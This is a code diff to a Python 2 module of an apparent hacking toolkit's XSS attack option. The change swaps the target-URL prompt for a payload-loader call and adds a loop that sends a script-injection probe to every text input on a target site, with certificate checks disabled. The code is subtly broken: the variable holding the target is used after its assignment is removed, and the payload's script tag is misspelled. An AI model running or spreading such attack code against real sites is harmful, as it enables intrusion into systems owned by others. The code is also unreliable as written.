@@ -2,6 +2,7 @@ try:
     from src.Colors import TextColor
     import src.libs as lib
     from Config.WebConfig import define_headerdata
+    from .payloads.loader import MakeSelection
     from Config.RecOS import IsOSDarwin, IsOSLinux
 except Exception as err:
     raise SystemExit, 'Something is wrong: %s'% err
@@ -27,7 +28,9 @@ def PrintXssMask():
 def MainXSS():
     print PrintXssMask()
 
-    rhost = raw_input(TextColor.CVIOLET + "Fhack/webAttack/XSS/# Enter site url: " + TextColor.WHITE)
+    MakeSelection()
+
+
 
     define_headerdata['referer'] = rhost
 
@@ -38,9 +41,13 @@ def MainXSS():
     else:
         soup = lib.BS(response.content, "lxml")
 
-    for line in soup.find_all('input', {'type': 'text'}):
-        print lib.urlparse.urlparse(line['name'])[2]
+    with lib.requests.Session() as session:
+        for line in soup.find_all('input', {'type': 'text'}):
 
+            parameter = str(lib.urlparse.urlparse(line['name'])[2])
+
+            response = session.get(url=rhost, params={parameter: "<scrip>alert('FHack');</script>"}, verify=False)
+            print response.content
 
 
 if __name__ == "__main__":
